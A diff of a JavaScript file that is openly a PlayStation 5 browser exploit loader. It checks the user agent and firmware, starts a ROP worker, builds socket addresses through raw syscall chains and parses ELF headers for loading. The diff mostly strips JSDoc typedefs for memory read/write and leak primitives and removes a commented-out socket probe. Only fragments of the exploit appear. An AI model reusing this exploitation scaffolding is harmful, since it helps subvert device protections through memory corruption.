@@ -1,49 +1,3 @@
-// @ts-check
-
-
-/**
- * @typedef {Object} UserlandRW
- * @property {function(any, any): void} write8
- * @property {function(any, any): void} write4
- * @property {function(any, any): void} write2
- * @property {function(any, any): void} write1
- * @property {function(any): int64} read8
- * @property {function(any): number} read4
- * @property {function(any): number} read2
- * @property {function(any): number} read1
- * @property {function(any): int64} leakval
- */
-
-/**
- * @typedef {Object} WebkitPrimitives
- * @property {function(any, any): void} write8
- * @property {function(any, any): void} write4
- * @property {function(any, any): void} write2
- * @property {function(any, any): void} write1
- * @property {function(any): int64} read8
- * @property {function(any): number} read4
- * @property {function(any): number} read2
- * @property {function(any): number} read1
- * @property {function(any): int64} leakval
- * 
- * @property {function(any): void} pre_chain
- * @property {function(any): Promise<void>} launch_chain
- * @property {function(any): int64} malloc_dump
- * @property {function(any, number=): int64} malloc
- * @property {function(int64, number): Uint8Array} array_from_address
- * @property {function(any): int64} stringify
- * @property {function(any, number=): string} readstr
- * @property {function(int64, string): void} writestr
- * 
- * @property {int64} libSceNKWebKitBase
- * @property {int64} libSceLibcInternalBase
- * @property {int64} libKernelBase
- * 
- * @property {any[]} nogc
- * @property {any} syscalls
- * @property {any} gadgets 
- */
-
 if (!navigator.userAgent.includes('PlayStation 5')) {
     alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
     throw new Error("");
@@ -67,14 +21,6 @@ if (!supportedFirmwares.includes(fw_str)) {
 let nogc = [];
 
 let worker = new Worker("rop_slave.js");
-
-/**
- * @param {UserlandRW|WebkitPrimitives} p 
- * @param {int64} buf 
- * @param {number} family 
- * @param {number} port 
- * @param {number} addr 
- */
 function build_addr(p, buf, family, port, addr) {
     p.write1(buf.add32(0x00), 0x10);
     p.write1(buf.add32(0x01), family);
@@ -456,29 +402,6 @@ async function main(userlandRW, wkOnly = false) {
         ip = { ip: "", name: "Offline" };
     }
 
-    // async function probe_sb_elfldr() {
-    //     let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
-    //     if (fd <= 0) {
-    //         return false;
-    //     }
-
-    //     let addr = p.malloc(0x10);
-    //     // let localhost = aton("127.0.0.1");
-    //     // alert("localhost: " + localhost.toString(16));
-    //     build_addr(addr, AF_INET, htons(9021), 0x0100007F);
-    //     let connect_res = (await chain.syscall(SYS_CONNECT, fd, addr, 0x10)).low << 0;
-    //     if (connect_res < 0) {
-    //         await chain.syscall(SYS_CLOSE, fd);
-    //         return false;
-    //     }
-
-    //     // send something otherwise elfldr will get stuck
-    //     let write_res = (await chain.syscall(SYS_WRITE, fd, addr, 0x1)).low << 0;
-
-    //     await chain.syscall(SYS_CLOSE, fd);
-    //     return true;
-    // }
-
     async function probe_sb_elfldr() {
         // if the bind fails, elfldr is running so return true
         let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
@@ -676,7 +599,6 @@ async function main(userlandRW, wkOnly = false) {
             let rela_table_count = 0;
             let rela_table_size = 0;
             let rela_table_entsize = 0;
-            /** @type {int64} */
             let shadow_write_mapping = 0;
 
             // Parse program headers and map segments
@@ -1302,5 +1224,6 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 // @ts-ignore
 fwScript.setAttribute('src', `${window.fw_str}.js`);
+
 
 
